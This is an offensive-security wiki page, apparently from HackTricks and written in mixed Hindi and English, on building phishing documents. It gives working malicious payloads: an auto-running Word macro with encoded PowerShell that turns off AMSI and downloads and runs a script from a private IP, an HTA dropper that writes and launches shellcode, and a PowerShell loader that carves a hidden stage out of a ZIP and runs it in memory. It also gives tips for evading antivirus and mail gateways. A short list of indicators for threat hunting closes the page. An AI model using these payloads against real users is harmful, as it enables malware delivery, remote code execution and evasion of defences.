# Phishing फ़ाइलें और दस्तावेज़

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word किसी फ़ाइल को खोलने से पहले फ़ाइल डेटा वैलिडेशन करता है। डेटा वैलिडेशन डेटा स्ट्रक्चर की पहचान के रूप में, OfficeOpenXML मानक के खिलाफ किया जाता है। यदि डेटा स्ट्रक्चर पहचान के दौरान कोई त्रुटि होती है, तो विश्लेषण की जा रही फ़ाइल नहीं खोली जाएगी।

आम तौर पर, macros वाले Word फ़ाइलें `.docm` एक्सटेंशन का उपयोग करती हैं। हालांकि, फ़ाइल एक्सटेंशन बदलकर फ़ाइल का नाम बदलना और उनकी macros चलाने की क्षमता बनाए रखना संभव है.\
उदाहरण के लिए, एक RTF फ़ाइल डिज़ाइन के अनुसार macros को सपोर्ट नहीं करती, लेकिन एक DOCM फ़ाइल जिसे RTF में नाम बदल दिया जाए, Microsoft Word द्वारा हैंडल की जाएगी और macros चलाने में सक्षम होगी.\
उसी आंतरिक संरचनाएँ और मेकैनिज़्म Microsoft Office Suite (Excel, PowerPoint etc.) के सभी सॉफ़्टवेयर पर लागू होते हैं।

आप निम्नलिखित कमांड का उपयोग करके यह जांच सकते हैं कि कौन से एक्सटेंशन कुछ Office प्रोग्राम्स द्वारा execute किए जाने वाले हैं:
```bash
assoc | findstr /i "word excel powerp"
```
macros शामिल करने वाले रिमोट टेम्पलेट को संदर्भित करने वाली DOCX फ़ाइलें (File –Options –Add-ins –Manage: Templates –Go) macros को भी “execute” कर सकती हैं।

### बाहरी इमेज लोड

जाएँ: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

दस्तावेज़ से arbitrary code चलाने के लिए macros का उपयोग करना संभव है।

#### Autoload functions

जितने अधिक सामान्य वे होते हैं, उतनी अधिक संभावना होती है कि AV उन्हें पहचान लेगा।

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### मैन्युअली मेटाडेटा हटाएँ

पर जाएँ **File > Info > Inspect Document > Inspect Document**, जो Document Inspector खोलेगा। **Inspect** पर क्लिक करें और फिर **Document Properties and Personal Information** के बगल में **Remove All** पर क्लिक करें।

#### Doc एक्सटेंशन

जब समाप्त कर लें, **Save as type** ड्रॉपडाउन चुनें, फ़ॉर्मेट को **`.docx`** से बदलकर **Word 97-2003 `.doc`** करें.\
यह इसलिए करें क्योंकि आप **can't save macro's inside a `.docx`** और macro-enabled **`.docm`** एक्सटेंशन के बारे में एक **stigma** है (उदा. थंबनेल आइकन पर एक बड़ा `!` होता है और कुछ वेब/ईमेल गेटवे इन्हें पूरी तरह ब्लॉक कर देते हैं)। इसलिए, यह **legacy `.doc` extension is the best compromise**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. यह user interface उत्पन्न करता है और एक "fully trusted" application के रूप में निष्पादित होता है, ब्राउज़र की सुरक्षा मॉडल की सीमाओं के बिना।

HTA को **`mshta.exe`** का उपयोग करके चलाया जाता है, जो आम तौर पर **Internet Explorer** के साथ **installed** होता है, जिससे **`mshta` dependant on IE** बनता है। इसलिए यदि इसे अनइंस्टॉल कर दिया गया है, तो HTAs निष्पादित नहीं हो पाएंगे।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication को मजबूर करना

There are several ways to **force NTLM authentication "remotely"**, for example, you could add **invisible images** to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**

**इन विचारों और अधिक को निम्नलिखित पृष्ठों में देखें:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह न भूलें कि आप सिर्फ hash या authentication चुराने तक सीमित नहीं हैं, बल्कि **perform NTLM relay attacks** भी कर सकते हैं:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Highly effective campaigns एक ZIP deliver करती हैं जिसमें दो legitimate decoy documents (PDF/DOCX) और एक malicious .lnk होता है. चाल यह है कि वास्तविक PowerShell loader ZIP के raw bytes में एक unique marker के बाद stored होता है, और .lnk उसे carve करके पूरी तरह memory में run कर देता है।

Typical flow implemented by the .lnk PowerShell one-liner:

1) सामान्य paths में original ZIP locate करें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और current working directory का parent.
2) ZIP bytes पढ़ें और एक hardcoded marker (e.g., xFIQCV) खोजें. Marker के बाद जो कुछ भी है वह embedded PowerShell payload है.
3) ZIP को %ProgramData% में copy करें, वहां extract करें, और decoy .docx खोलें ताकि यह legitimate लगे.
4) वर्तमान process के लिए AMSI bypass करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) अगले stage को deobfuscate करें (उदा., सभी # characters हटाना) और इसे memory में execute करें.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
नोट्स
- Delivery अक्सर प्रतिष्ठित PaaS subdomains (उदा., *.herokuapp.com) का दुरुपयोग करता है और हो सकता है कि payloads को gate करे (IP/UA के आधार पर सुरक्षित ZIPs परोसे).
- अगला चरण अक्सर base64/XOR shellcode को decrypt करता है और इसे Reflection.Emit + VirtualAlloc के माध्यम से execute करता है ताकि डिस्क पर निशान कम हों।

समान चेन में प्रयुक्त Persistence
- COM TypeLib hijacking of the Microsoft Web Browser control ताकि IE/Explorer या कोई भी ऐप जो इसे embed करता है, payload को स्वचालित रूप से re-launch कर दे। यहां विवरण और ready-to-use commands देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP फ़ाइलें जिनमें archive data के अंत में ASCII marker string (उदा., xFIQCV) जुड़ी होती हैं।
- .lnk जो parent/user फ़ोल्डरों को सूचीबद्ध करके ZIP का पता लगाती है और एक decoy document खोलती है।
- AMSI tampering [System.Management.Automation.AmsiUtils]::amsiInitFailed के माध्यम से।
- लंबी चलने वाली business threads जो trusted PaaS domains पर होस्ट किए गए links के साथ समाप्त होती हैं।

## संदर्भ

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
